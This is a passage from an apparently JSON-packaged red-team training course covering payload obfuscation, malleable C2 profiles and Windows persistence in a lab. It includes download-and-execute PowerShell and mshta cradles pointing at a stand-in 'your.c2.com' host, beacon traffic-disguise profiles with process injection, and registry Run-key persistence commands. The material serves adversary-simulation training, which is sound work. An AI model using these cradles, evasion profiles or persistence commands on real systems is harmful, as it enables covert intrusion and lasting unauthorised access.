novel technique to VirusTotal. Uploading shares the file with all vendors and the community. This is only suitable for testing *publicly available* tools/payloads or extremely simple, non-sensitive test files (like a basic `calc.exe` launcher you wrote yourself).\r\n    *   **How to use:** Upload your obfuscated payload file. Look at the \"Detection\" tab. Look at the \"Behavioral\" tab to see what processes were spawned, what files were touched, what network connections were attempted. This gives you insight into what *behavioral* detection might catch.\r\n\r\nThe goal is to get a feel for how readily your techniques are flagged and where defenders might see your activity.\r\n\r\n#### 6.5 Module Project/Exercise Deep Dive: Project 6.1 - Obfuscate and Re-execute\r\n\r\nAlright, hands back on the keyboard! This project is about taking what we built in Modules 4 and 5 and adding that crucial first layer of evasion.\r\n\r\n**Project 6.1: Obfuscate and Re-execute**\r\n\r\n**Objective:** Apply a simple obfuscation technique to your payload or execution command and observe its effect on detection and logging compared to the original.\r\n\r\n**Steps:**\r\n\r\n1.  **Identify Your Target (Payload/Command):** Go back to your successful Module 5 execution. What was the exact command line you ran on the target workstation? What was the payload file (if any) you hosted and executed? *Example: Maybe you used `mshta http://your.c2.com/payload.hta` or `powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://your.c2.com/payload.ps1')\"`.*\r\n2.  **Choose an Obfuscation Technique:** Select *one* simple technique from Section 6.2 to apply.\r\n    *   **Option A (Command Line Encoding):** If your execution involved a script interpreter (`powershell`, `cscript`, `wscript`, `mshta` with script inside), encode the script block or command string using Base64 (like the PowerShell example in 6.2.1).\r\n    *   **Option B (Simple File Obfuscation):** If you were executing a small file (like a `.ps1` script or a simple executable stub), try applying a simple XOR (conceptually, you don't need to build a full XOR loader, just understand the file bytes would change). *For practical purposes in this lab, encoding a command line is often easier to demonstrate.*\r\n    *   **Option C (String Obfuscation in Script):** If your payload was a script, modify it to obfuscate a key string (like a file path or a URL) using concatenation or another simple method (like the PowerShell example in 6.2.3).\r\n3.  **Apply the Obfuscation:**\r\n    *   **If encoding a command line:** Take the script/command string, encode it (e.g., using the Python script from 6.2.1 for PowerShell), and construct the new execution command (`powershell -enc ...`).\r\n    *   **If modifying a script payload:** Edit your script file (e.g., `payload.ps1`, `payload.hta`) to obfuscate a string within it. Host the *obfuscated* version on your web server (Module 3).\r\n4.  **Update Hosting (If necessary):** If you modified a payload file (Option B or C), ensure the obfuscated version is now hosted on your web server configured in Module 3. If you just changed the command line (Option A), you might not need to change the hosted file itself, just the command you run.\r\n5.  **Execute the Obfuscated Payload/Command:** Go back to your target workstation VM in the lab (Module 2). Execute the *new*, obfuscated command line or trigger the execution of the obfuscated payload file (e.g., browse to the updated HTA file, run the new PowerShell command).\r\n6.  **Verify Execution & Callback:** Does it still work? Do you get a callback in your C2 framework (even if it's just a simple connect-back)? If not, troubleshoot your obfuscation or the execution command.\r\n7.  **Analyze the Logs (SIEM - Module 2):** This is a critical step!\r\n    *   Connect to your Splunk Free or ELK instance.\r\n    *   Search for events related to the execution *after* you applied obfuscation. Look for:\r\n        *   Process Creation events (Sysmon Event ID 1, Security Event ID 4688): How does the command line look now? Is the original command visible or is it encoded/obfuscated?\r\n        *   Network Connection events (Sysmon Event ID 3): Do you see the outbound connection to your C2 redirector? Does it look the same as before?\r\n    *   Compare these logs side-by-side with the logs you collected from the *original*, non-obfuscated execution in Module 5. What are the differences in visibility? Did the obfuscation hide the command line arguments? Did it change how the process was logged?\r\n8.  **Observe AV (If applicable):** If you have a test AV installed, did it detect the obfuscated payload/command? Did it detect the original? Note any differences.\r\n9.  **Document Your Findings:** Briefly summarize:\r\n    *   The original payload/command.\r\n    *   The obfuscation technique you applied.\r\n    *   The new obfuscated command/payload.\r\n    *   Whether execution/callback was successful.\r\n    *   What you observed in the SIEM logs (how did the obfuscation change the log entries for execution and network connection?).\r\n    *   Any differences in AV detection (if tested).\r\n\r\nThis project directly builds on Module 5, adding the layer of evasion. You're seeing firsthand how a simple change can affect detection visibility in your lab environment.\r\n\r\n**Contribution to Capstone:** This project adds the crucial *evasion* layer, making the initial access technique more realistic and resilient against basic defenses. It directly modifies the execution phase components (payload and command) built in prior modules and uses the monitoring infrastructure from Module 2 to evaluate effectiveness.\r\n\r\n---\r\n\r\n### Conclusion\r\n\r\nFantastic work, team! You've now taken your first steps into the world of evasion. You understand that security tools look for patterns – in files, in memory, in command lines, and in behavior. And you've applied basic techniques like encoding and string obfuscation to change those patterns and make your activity less conspicuous.\r\n\r\nWe also got a high-level glimpse into more advanced concepts like AMSI, ETW, and Process Injection, understanding *why* they exist and *what* they aim to detect or evade. While we didn't implement complex bypasses, knowing *what* defenders are using helps us think about future, more sophisticated evasion strategies.\r\n\r\nYour Project 6.1 is a real demonstration of this. You've modified your attack chain and, critically, used your monitoring lab to see the impact. This feedback loop – attack, detect, analyze, evade – is the core rhythm of adversary simulation.\r\n\r\nWe've now got a basic, slightly stealthier initial access method. Next up, we'll look at how to manage our implants effectively using malleable profiles, giving us more control and helping us blend in further over the network.\r\n\r\nKeep building, keep experimenting, and keep asking \"how would a defender see this?\" That mindset is your most powerful tool!"
    },
    {
      "title": "module_7",
      "description": "module_7 Overview",
      "order": 7,
      "content": "Alright team, settle in! This is where we start adding some serious stealth to our operation. We've built our lab, set up our basic comms, crafted a payload, and even got it to execute and call back. Fantastic progress! But let's be real: a default connection from a generic implant is *screaming* \"malicious!\" to any decent security tool watching the network.\r\n\r\nThis module, **Module 7: Implant Management with Malleable C2**, is all about making our implants blend in. We're going to learn how to shape our command and control traffic so it looks less like a threat actor and more like… well, whatever we want it to look like. This is a critical layer of operational security (OpSec) for any serious simulation. We're not just getting in; we're learning how to *stay* connected without immediately triggering alarms.\r\n\r\n---\r\n\r\n## CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n### Module 7: Implant Management with Malleable C2\r\n\r\n*   **Module Objective:** By the end of this module, learners will understand the importance of C2 profile malleability and be able to configure basic options to control implant behavior and blend in with legitimate network traffic.\r\n\r\n---\r\n\r\n#### 7.1 The Need for Malleable C2 Profiles: Blending In\r\n\r\n**Why Default C2 is Loud:**\r\n\r\nImagine you have a piece of malware that calls home every 5 seconds, always using the same, unique User-Agent string (\"MySuperMalware 1.0\"), sending data in a fixed, unusual pattern, and connecting to an IP address with no associated DNS name. How long do you think that would go unnoticed by network monitoring tools, intrusion detection systems (IDS), or even just a sharp analyst looking at logs? Not long at all!\r\n\r\nSecurity tools and analysts look for *anomalies* and *signatures*.\r\n\r\n*   **Signatures:** Specific byte patterns in network traffic, unique combinations of HTTP headers, known malicious domains or IPs.\r\n*   **Anomalies:** Unusual connection patterns (frequency, size, destination), traffic that doesn't look like standard applications (web browsing, email, updates).\r\n\r\nDefault C2 frameworks often have recognizable patterns. Their implants might use default User-Agents, fixed URIs (the path in a web request, like `/submit.php`), predictable check-in intervals, and distinct data encoding/encryption methods. These defaults become signatures that defenders can write rules for.\r\n\r\n**Enter Malleable C2:**\r\n\r\nMalleable C2 (or sometimes called \"C2 profiles\" or \"traffic shapers\") is the answer. It's the ability to customize the *appearance* and *behavior* of your implant's communication traffic. Instead of being stuck with a loud, distinct signature, you can mold your traffic to look like something else – legitimate web browsing, a software update, a specific application's traffic, or anything else you can define.\r\n\r\n**The Goal:** Blend in with the noise. Make your malicious traffic indistinguishable (or at least very difficult to distinguish) from the normal, expected network activity in the target environment. This significantly increases the time before detection (dwell time) and makes the defender's job much harder.\r\n\r\n#### 7.2 Introduction to Malleable C2 Profile Concepts\r\n\r\nOkay, so how do we achieve this blending? Malleable C2 frameworks use *profiles* – configuration files that dictate exactly how the implant (often called a \"beacon\" or \"agent\") communicates with the C2 server or redirector.\r\n\r\nThink of it like a script or a set of instructions for the implant's network stack:\r\n*   \"When you check in, use this specific User-Agent string.\"\r\n*   \"Request this URL path.\"\r\n*   \"Add these specific HTTP headers.\"\r\n*   \"Encrypt/encode the data this way before sending it.\"\r\n*   \"Wait this long before the next check-in, but add some randomness.\"\r\n\r\n**Frameworks and Profiles:**\r\n\r\nWhile the concepts are universal, the syntax and capabilities vary between C2 frameworks.\r\n*   **Cobalt Strike:** Has a well-known and powerful malleable C2 profile language. This is often the *de facto* standard used for teaching and examples because its profiles are human-readable and demonstrate the core concepts clearly. We will use Cobalt Strike's syntax to illustrate the *concepts* in this module.\r\n*   **Mythic:** Uses profiles defined in Python, offering great flexibility.\r\n*   **Sliver:** Uses profiles defined in a human-readable text format, similar in concept to Cobalt Strike.\r\n*   **Metasploit (limited):** While you can configure some aspects like User-Agent, it lacks the deep malleability of dedicated C2 frameworks.\r\n\r\n**Key Takeaway:** You don't need to *own* Cobalt Strike to understand malleable profiles. The core concepts are what matter, and you can learn them by studying sample profiles and understanding the different configuration options, which are often replicated (with different syntax) in open-source alternatives.\r\n\r\nA profile typically defines two main things:\r\n1.  **How the implant makes requests (HTTP GET/POST):** What the outgoing traffic looks like.\r\n2.  **How the C2 server responds:** What the incoming traffic (commands, tasks, data) looks like when sent back to the implant.\r\n\r\nBy controlling both sides, you can make the communication look like a standard client-server interaction (e.g., a web browser requesting a page, or a software client checking for updates).\r\n\r\n#### 7.3 Configuring Basic HTTP/S Options\r\n\r\nThis is where we get specific with *what* we can control in the profile to make our HTTP/S traffic look legitimate. We'll use simplified examples based on Cobalt Strike's profile language structure.\r\n\r\nA profile often has blocks for `http-get` (implant checking in, getting tasks) and `http-post` (implant sending data, results). Within these blocks, you define the request and response.\r\n\r\n```\r\n# Example (Simplified Cobalt Strike Syntax)\r\n\r\nhttp-get {\r\n    set uri \"/news/feed.php\"; # What URL path does the implant request?\r\n\r\n    client {\r\n        # How the implant's request looks\r\n        header \"User-Agent\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"; # Standard Chrome UA\r\n        header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\";\r\n        header \"Referer\" \"https://www.google.com/\"; # Make it look like they clicked from Google\r\n        header \"Host\" \"update.legit-software.com\"; # Specify the Host header (crucial for redirectors/domain fronting)\r\n\r\n        metadata {\r\n            # How implant metadata (session ID, etc.) is sent in the request\r\n            base64; # Encode metadata with base64\r\n            header \"Cookie\"; # Send metadata in a Cookie header\r\n        }\r\n    }\r\n\r\n    server {\r\n        # How the C2 server's response looks\r\n        header \"Server\" \"Apache\"; # Look like a standard web server\r\n        header \"Content-Type\" \"text/html; charset=utf-8\";\r\n\r\n        output {\r\n            # How tasks/commands are sent back to the implant\r\n            base64; # Encode output with base64\r\n            print; # Print the encoded data directly in the response body\r\n        }\r\n    }\r\n}\r\n\r\nhttp-post {\r\n    set uri \"/process/data.php\"; # What URL path does the implant post to?\r\n\r\n    client {\r\n        # How the implant's request looks when sending data\r\n        header \"User-Agent\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\";\r\n        header \"Content-Type\" \"application/x-www-form-urlencoded\"; # Look like a form submission\r\n\r\n        id {\r\n             # How the implant's session ID is sent in the post request\r\n             parameter \"session\"; # Send session ID as a URL parameter: /process/data.php?session=...\r\n         }\r\n\r\n        output {\r\n            # How the implant sends task results/data\r\n            base64; # Encode output with base64\r\n            parameter \"data\"; # Send encoded data as a URL parameter: /process/data.php?session=...&data=...\r\n        }\r\n    }\r\n\r\n    server {\r\n        # How the C2 server responds after receiving data (often just a simple 200 OK)\r\n        header \"Server\" \"Apache\";\r\n        header \"Content-Type\" \"text/html; charset=utf-8\";\r\n        print \"OK\"; # Simple response body\r\n    }\r\n}\r\n```\r\n\r\nLet's break down the key parts relevant to basic configuration:\r\n\r\n*   **`set uri`:** Defines the path the implant will request or post to. Choose paths that look normal (e.g., `/updates`, `/api/v1/status`, `/images/load`). Avoid suspicious paths like `/beacon` or `/data`.\r\n*   **`header \"[Header-Name]\" \"[Value]\"`:** Allows setting arbitrary HTTP headers. This is crucial.\r\n    *   **`User-Agent`:** A string identifying the client software. Mimic common browsers (`Mozilla/... Chrome/...`), common applications (`Microsoft-WNS/...`), or update clients. *Never* use a default or obviously malicious User-Agent.\r\n    *   **`Host`:** The domain name the client is requesting. This is vital if you're using redirectors or domain fronting, as it tells the server which site you're trying to reach.\r\n    *   **`Referer`:** The URL of the page that linked to the current request. Can be set to make it look like the request came from a legitimate source (e.g., Google, a corporate portal).\r\n    *   **`Cookie`:** Used for session tracking on websites. Can be abused to send implant metadata or even data.\r\n    *   **`Accept`, `Accept-Language`, etc.:** Standard browser headers that make the request look normal.\r\n    *   **Custom Headers:** You can define your own headers, but be careful they don't stand out.\r\n*   **Metadata/ID/Output:** These sections define *how* the implant sends its session ID, initial metadata, and subsequent task output back to the C2.\r\n    *   `base64`, `base64url`, `hex`: Common encodings to make the data look less like raw shellcode/output.\r\n    *   `header`, `parameter`, `uri`, `print`: Define *where* in the request (header, URL parameter, URI path itself) or response (body via `print`) the encoded data is placed.\r\n    *   **OpSec Note:** Avoid putting sensitive data directly in the URI path or parameters if it's easily visible in proxies or logs. Headers or encrypted body data are generally stealthier.\r\n\r\n**Practical Tip:** Look at the HTTP traffic generated by legitimate applications in your target environment using a tool like Burp Suite or Fiddler (if you were doing a real assessment) or just by browsing common websites with your browser's developer tools. Copy those headers, URIs, and patterns!\r\n\r\n#### 7.4 Configuring Communication Timings\r\n\r\nThe *frequency* and *predictability* of communication are major detection vectors.\r\n\r\n*   A beacon checking in exactly every 5 seconds is highly suspicious. Legitimate traffic is usually bursty and unpredictable.\r\n*   Very frequent check-ins (e.g., < 1 second) are also suspicious and noisy.\r\n\r\nMalleable profiles allow you to control this:\r\n\r\n*   **`sleep`:** This sets the base time (in seconds, minutes, etc.) the implant waits between checking in. A longer sleep is stealthier but means slower response times for you.\r\n    ```\r\n    set sleep \"30s\"; # Wait 30 seconds between check-ins\r\n    ```\r\n*   **`jitter`:** This is *crucial* for breaking predictability. Jitter adds a random percentage *variation* to the sleep time.\r\n    ```\r\n    set jitter \"20\"; # Add +/- 20% randomness to the sleep time\r\n    ```\r\n    If `sleep` is 30 seconds and `jitter` is 20%, the actual sleep time will be randomly chosen between `30 * (1 - 0.20)` and `30 * (1 + 0.20)`, which is between 24 seconds and 36 seconds. This makes timing analysis much harder for defenders.\r\n\r\n*   **`killdate`:** A vital OpSec setting! This defines a date and time after which the implant will *stop* calling back. This prevents your implants from living forever in a network, potentially being discovered months later after your engagement is over or your infrastructure is gone.\r\n    ```\r\n    set killdate \"01/01/2025\"; # Implant stops calling back after January 1, 2025\r\n    ```\r\n\r\n**Practical Tip:** Choose a `sleep` time appropriate for the required responsiveness vs. stealth. For initial access and persistence, a longer sleep (30s-5m) is often acceptable and stealthier. For interactive command execution, you might temporarily lower it, but be aware of the increased risk. Always use `jitter`! Always set a `killdate`.\r\n\r\n#### 7.5 Understanding Sacrificial Processes\r\n\r\nThis subtopic is about *where* your implant code runs on the target system, and how the profile can influence this for evasion.\r\n\r\nWhen your initial payload executes (like we did in Module 5), it runs within a process. If it's a simple executable, it runs in its own process (`payload.exe`). If it's a script executed by `mshta` or `powershell`, it runs within that process.\r\n\r\nHowever, security tools pay close attention to processes: their names, their command lines, their parent processes, and the network connections they make. A process like `cmd.exe` or `powershell.exe` making a network connection to a strange IP is suspicious. A custom executable running with a weird name is also suspicious.\r\n\r\n**Sacrificial Process Concept:** Instead of the main implant code running directly in the initial execution process (which might be flagged), the implant can *spawn* a new, legitimate-looking process (a \"sacrificial\" process) and *inject* its code into that process. The network communication then originates from the *sacrificial* process, making it harder to attribute the malicious traffic to the initial execution vector.\r\n\r\n**Why it aids Evasion:**\r\n1.  **Process Hiding:** The malicious code is now running inside `explorer.exe`, `svchost.exe`, `dllhost.exe`, or another common Windows process. This is much less suspicious than a standalone `beacon.exe` or a `powershell` process with a long, encoded command line making a network connection.\r\n2.  **Network Connection Blending:** The network connection appears to originate from a process that *legitimately* makes network connections, making it harder to spot among normal activity.\r\n\r\n**How Profiles Help:** Malleable C2 profiles often have settings to control *which* process the implant should spawn and inject into.\r\n\r\n```\r\n# Example (Simplified Cobalt Strike Syntax)\r\n\r\nprocess-inject {\r\n    set spwan_to { # Define where to inject\r\n        # Use a common, legitimate process, potentially varying based on architecture (x86/x64)\r\n        # Note: The actual process list depends on the OS version and installed software\r\n        # Common examples: explorer.exe, svchost.exe, dllhost.exe, powershell.exe (though powershell is often monitored)\r\n        x64 \"%windir%\\\\syswow64\\\\explorer.exe\";\r\n        x86 \"%windir%\\\\system32\\\\explorer.exe\";\r\n    }\r\n    # ... other injection settings (how to inject) ...\r\n}\r\n```\r\n\r\n**Key Takeaway:** While the *mechanics* of process injection are complex (and beyond the scope of this foundational module), understanding that implants often run inside other processes *for stealth* and that your C2 profile can *specify* which process to use is important. Choosing a sacrificial process that is common and expected to make network connections improves stealth.\r\n\r\n#### 7.6 Basic OpSec Considerations for C2 Communications\r\n\r\nOperational Security isn't just about traffic profiles; it's about the entire lifecycle and visibility of your C2.\r\n\r\n*   **Use Redirectors (Module 3 Recap):** Your C2 server shouldn't have direct inbound connections from implants. Redirectors protect your actual C2 server's IP address. If a redirector gets blocked or investigated, you can pivot to a new one without losing your entire operation.\r\n*   **Use HTTPS with Valid Certificates:** Network defenders often filter or inspect non-HTTPS traffic. Using HTTPS encrypts the *contents* of your C2 communication, making it harder to see the commands and data being transferred. Using a certificate (even a free Let's Encrypt cert or a self-signed one *for testing*) makes the initial TLS handshake look more legitimate than a connection to a raw IP or a site with certificate errors (though advanced defenders *do* check certificate details).\r\n*   **Avoid Default Profile Values:** Don't use the built-in default profile of your C2 framework. Defenders know these defaults and actively look for them.\r\n*   **Test Your Profile:** Before using a profile in a simulation, test it!\r\n    *   Run an implant using the profile in your lab.\r\n    *   Use Wireshark on your redirector/C2 to inspect the traffic. Does it look like you intended? Are the headers correct? Is the timing variable?\r\n    *   Check your SIEM (Module 2) logs. Does the network connection from the implant's process look suspicious? Are there any immediate alerts based on the connection details?\r\n*   **DNS:** If using domain names, ensure they aren't on public blacklists. Consider using domain generation algorithms (DGAs) or fast flux (more advanced topics) in real ops, but for simulation, a clean, non-suspicious domain is key.\r\n*   **Infrastructure Lifespan:** Don't use the same infrastructure (IPs, domains) across multiple, unrelated engagements. Burn down infrastructure after an operation or if you suspect it's been detected.\r\n\r\n#### 7.7 Analyzing C2 Traffic\r\n\r\nHow do we know if our profile is working? We look at the traffic and the logs!\r\n\r\n*   **Wireshark (or tcpdump):** Run a packet capture on your redirector or C2 server's network interface. Filter for traffic on the port your C2 is listening on.\r\n    *   **What to look for:**\r\n        *   **Destination IP/Port:** Should be your redirector/C2.\r\n        *   **HTTP/S Requests:**\r\n            *   **User-Agent:** Does it match your profile?\r\n            *   **Headers:** Are the headers you specified present? Do they look normal? Are there any unexpected headers?\r\n            *   **URI Path:** Does it match your `set uri`?\r\n            *   **Request Method (GET/POST):** Does it match your profile configuration?\r\n            *   **Data (if not HTTPS or if you decrypt):** Is the data encoded/encrypted as expected?\r\n        *   **Timings:** Are the connections happening at fixed intervals, or is there `jitter`?\r\n*   **SIEM (Splunk/ELK from Module 2):** Look at the logs generated on the *target* machine.\r\n    *   **Sysmon Event ID 1 (Process Creation):** What process initiated the network connection? If using sacrificial processes, is it the expected legitimate process? Look at the command line of the process – does it look normal?\r\n    *   **Sysmon Event ID 3 (Network Connection):** What is the source process, destination IP/port, and protocol? Does the destination IP/port match your C2? Does the process name look suspicious making that connection?\r\n    *   **Windows Security Event ID 4688 (Process Creation - requires auditing):** Similar to Sysmon 1, shows process creation and command line.\r\n    *   **Firewall Logs:** Any blocks? Any detections based on IP or domain?\r\n    *   **Web Proxy Logs (if applicable in a real environment):** These logs are gold for defenders, showing the full HTTP request details (UA, headers, URIs). This is why profile malleability is essential.\r\n\r\nBy analyzing the traffic and logs, you can verify that your profile is being applied correctly and see what a defender *might* see. This helps you refine your profile for better stealth.\r\n\r\n---\r\n\r\n#### Suggested Resources or Prerequisites (Recap):\r\n\r\n*   Basic understanding of HTTP/HTTPS requests and responses (headers, methods, URIs).\r\n*   Familiarity with text configuration files.\r\n*   Access to a C2 framework that supports malleable profiles (Cobalt Strike trial, Mythic, or Sliver are good examples to *study* the profile concepts, even if not used for the full capstone build).\r\n*   Sample Malleable C2 profiles (e.g., from Cobalt Strike's GitHub repo - search for \"malleable-c2\").\r\n*   A tool for inspecting network traffic like Wireshark (optional but highly recommended).\r\n\r\n---\r\n\r\n#### Module Project/Exercise:\r\n\r\nAlright, hands-on time! Let's get a feel for how these profiles actually look and work.\r\n\r\n**Project 7.1: Configure a Basic Malleable Profile**\r\n\r\nThe goal here is to take a standard profile structure and modify key elements to change the fingerprint of our C2 communication. We'll use the structure inspired by Cobalt Strike profiles as the learning example, as they are widely available for study.\r\n\r\n**Steps:**\r\n\r\n1.  **Obtain a Sample Profile Structure:** You can find numerous examples online by searching for \"Cobalt Strike malleable C2 profiles GitHub\". Look for a relatively simple HTTP-based profile. You don't need the C2 framework itself to *read* and *modify* the text file.\r\n\r\n    *   *Instructor Note:* A good starting point for learners is often the sample profiles provided in Cobalt Strike's official documentation or repositories. We'll use a simplified template here for our exercise.\r\n\r\n    Create a new text file named `my_basic_profile.profile` and paste the following *basic template* into it:\r\n\r\n    ```\r\n    # This is a basic template for learning malleable profile concepts\r\n    # Based on Cobalt Strike syntax\r\n\r\n    http-get {\r\n        set uri \"/query\"; # Default check-in URI\r\n\r\n        client {\r\n            header \"User-Agent\" \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\"; # Default UA\r\n            # Add other default headers if they exist in your base template\r\n\r\n            metadata {\r\n                base64;\r\n                header \"Cookie\";\r\n            }\r\n        }\r\n\r\n        server {\r\n            header \"Server\" \"Microsoft-IIS/7.5\"; # Default Server header\r\n            output {\r\n                base64;\r\n                print;\r\n            }\r\n        }\r\n    }\r\n\r\n    http-post {\r\n        set uri \"/submit\"; # Default data submission URI\r\n\r\n        client {\r\n            header \"User-Agent\" \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\"; # Default UA\r\n            # Add other default headers\r\n\r\n            id {\r\n                parameter \"id\";\r\n            }\r\n            output {\r\n                base64;\r\n                parameter \"data\";\r\n            }\r\n        }\r\n\r\n        server {\r\n            header \"Server\" \"Microsoft-IIS/7.5\"; # Default Server header\r\n            output {\r\n                print \"OK\";\r\n            }\r\n        }\r\n    }\r\n\r\n    # Global options\r\n    set sleep \"60\"; # Default sleep 60 seconds\r\n    set jitter \"0\"; # Default jitter 0%\r\n    set killdate \"01/01/2030\"; # Default distant killdate\r\n\r\n    # Process Injection (simplified - specific techniques are complex)\r\n    process-inject {\r\n        set spwan_to {\r\n            x64 \"%windir%\\\\syswow64\\\\notepad.exe\"; # Default injection target\r\n            x86 \"%windir%\\\\system32\\\\notepad.exe\"; # Default injection target\r\n        }\r\n        # ... other injection settings\r\n    }\r\n    ```\r\n\r\n2.  **Modify the Profile:** Edit the `my_basic_profile.profile` file. Apply the following changes:\r\n\r\n    *   **Change User Agent:** In *both* the `http-get` and `http-post` client sections, change the `User-Agent` header to mimic a recent version of Chrome or Firefox on Windows.\r\n        *   *Example Chrome UA:* `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36`\r\n        *   *Example Firefox UA:* `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0`\r\n        *   *Choose one and replace the default.*\r\n    *   **Change URIs:** In the `http-get` section, change `/query` to something less generic, like `/news/feed.xml` or `/api/v2/status`. In the `http-post` section, change `/submit` to something like `/data/upload` or `/results.php`.\r\n    *   **Add a Referer Header (http-get):** In the `http-get` client section, add a `Referer` header to make it look like the request came from a common search engine or a corporate portal URL (e.g., `https://www.google.com/` or `https://portal.mycompany.com/`).\r\n    *   **Set Sleep and Jitter:** Change the `sleep` setting to a more realistic value (e.g., `30` seconds or `60` seconds). Change the `jitter` setting to a significant percentage (e.g., `25` or `30`).\r\n        *   *Example:* `set sleep \"45\";` `set jitter \"30\";`\r\n    *   **Set a Realistic Killdate:** Change the `killdate` to a date a week or two in the future.\r\n        *   *Example:* `set killdate \"07/15/2023\";` (Use a date relevant to when you are doing the exercise).\r\n    *   **Change Sacrificial Process (Optional but Recommended):** In the `process-inject` section's `spawn_to`, change `notepad.exe` to `explorer.exe` or `dllhost.exe`. *Note: Be cautious changing this in a live environment without testing, as some processes are more stable targets than others. For this exercise, simply changing the string is sufficient to understand the concept.*\r\n\r\n3.  **Analyze the Profile Syntax and Effect:** Review your modified `my_basic_profile.profile` file. Write a brief summary (a few sentences for each) explaining:"
    },
    {
      "title": "module_8",
      "description": "module_8 Overview",
      "order": 8,
      "content": "Alright team, pull up a chair! We've built our lab, set up our initial comms infrastructure, crafted our first payload, and even achieved initial execution and callback while thinking about evasion. That's huge! You've gotten the door open, maybe even wedged your foot in.\r\n\r\nBut here's the thing about doors – they can slam shut. Systems reboot, users log off, processes crash, defenders find and kill your initial shell. If your access is tied *only* to that one-time execution, you've lost your beachhead.\r\n\r\nThis is where **Persistence** comes in. It's about ensuring that even if the system restarts or your initial process dies, you have a way back in. It's securing that toehold, making it resilient. This module is all about understanding *where* adversaries hide their access mechanisms and *how* to set them up so we can simulate that crucial phase. Let's make our access sticky!\r\n\r\n---\r\n\r\n## CRTO Prep Part 1, Module 8: Initial Persistence Engineering\r\n\r\n**Module Objective:** By the end of this module, learners will be able to identify common persistence locations on Windows systems and implement several basic techniques to maintain access after a reboot or user logout.\r\n\r\n---\r\n\r\n### 8.1 Understanding Persistence: Why and What\r\n\r\n*   **What is Persistence?**\r\n    *   In adversary simulation (and real attacks), persistence refers to the techniques adversaries use to maintain access to systems across restarts, changes in credentials, and other interruptions that would otherwise cut off their access.\r\n    *   Think of it as leaving a backdoor open, but one that automatically re-opens itself.\r\n*   **Why is Persistence Necessary?**\r\n    *   **Maintaining Access:** The most critical reason. Initial access vectors (like phishing links, exploited vulnerabilities) are often one-time events. Persistence ensures continued access to the target environment over days, weeks, or months.\r\n    *   **Resilience:** If a compromised process is killed or the system reboots, persistence mechanisms automatically re-execute the malicious code.\r\n    *   **Escalation:** Persistence techniques can sometimes be combined with privilege escalation (covered in later modules) to ensure continued high-level access.\r\n*   **Persistence Categories (High-Level):**\r\n    *   **Execution Persistence:** Ensuring malicious code runs automatically (e.g., on logon, system boot, scheduled time). This is our primary focus in this module.\r\n    *   **Privilege Persistence:** Maintaining elevated privileges (often overlaps with Execution Persistence if the execution method runs with high privileges).\r\n    *   **Account Persistence:** Creating or compromising legitimate accounts.\r\n    *   **Configuration Persistence:** Modifying system configurations to aid future access (e.g., firewall rules, RDP settings).\r\n    *   *For the CRTO and this module, we'll focus heavily on **Execution Persistence** using common Windows features.*\r\n\r\n### 8.2 Common Persistence Locations on Windows\r\n\r\nWindows provides many legitimate ways for applications and users to start programs automatically. Adversaries abuse these same mechanisms to achieve persistence. Understanding these locations is key to both implementing and detecting persistence.\r\n\r\nLet's explore some of the most common ones:\r\n\r\n#### 8.2.1 Startup Folders\r\n\r\n*   **Location:**\r\n    *   `C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` (User-specific)\r\n    *   `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` (All Users)\r\n*   **How it Works:** Any executable, script, or even a shortcut (`.lnk`) placed in these folders will be executed automatically when the user logs in.\r\n*   **Adversary Use:** Simplest method. Drop a malicious executable, script, or a shortcut pointing to one of these locations.\r\n*   **OpSec Consideration:** Very high visibility. Easy for a user browsing their Start Menu or for security tools scanning known locations. Not ideal for stealthy operations.\r\n\r\n#### 8.2.2 Run and RunOnce Registry Keys\r\n\r\n*   **Location:**\r\n    *   `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (User-specific, runs on logon)\r\n    *   `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (All Users, runs on boot/logon)\r\n    *   `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce` (User-specific, runs *once* on logon, then the entry is deleted)\r\n    *   `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce` (All Users, runs *once* on boot/logon, then deleted)\r\n*   **How it Works:** Programs listed in these keys (as `REG_SZ` or `REG_EXPAND_SZ` values pointing to an executable path) are automatically launched by `explorer.exe` during the user logon process (`Run`) or by `winlogon.exe` during boot/logon (`RunOnce`).\r\n*   **Adversary Use:** A very common and effective method. Add a registry value pointing to your payload or a launcher script. `RunOnce` is useful for single-execution tasks or staging. `Run` is for persistent execution.\r\n*   **OpSec Consideration:** Less visible to a casual user than Startup folders, but easily found by security tools scanning known registry locations. Naming the value something that blends in is crucial.\r\n*   **Practical Example (Adding to HKCU Run):**\r\n    ```cmd\r\n    reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyAwesomeService\" /t REG_SZ /d \"C:\\Users\\Public\\my_payload.exe\" /f\r\n    ```\r\n    *   `/v \"MyAwesomeService\"`: Sets the value name (choose something less obvious!).\r\n    *   `/t REG_SZ`: Specifies the data type.\r\n    *   `/d \"C:\\Users\\Public\\my_payload.exe\"`: Sets the command to run.\r\n    *   `/f`: Forces overwrite if the value exists.\r\n*   **Practical Example (Adding to HKLM Run - Requires Admin):**\r\n    ```cmd\r\n    reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"SystemUpdateService\" /t REG_SZ /d \"%ProgramFiles%\\Common Files\\update.exe\" /f\r\n    ```\r\n    *   Note the use of `%ProgramFiles%` for better blending.\r\n\r\n#### 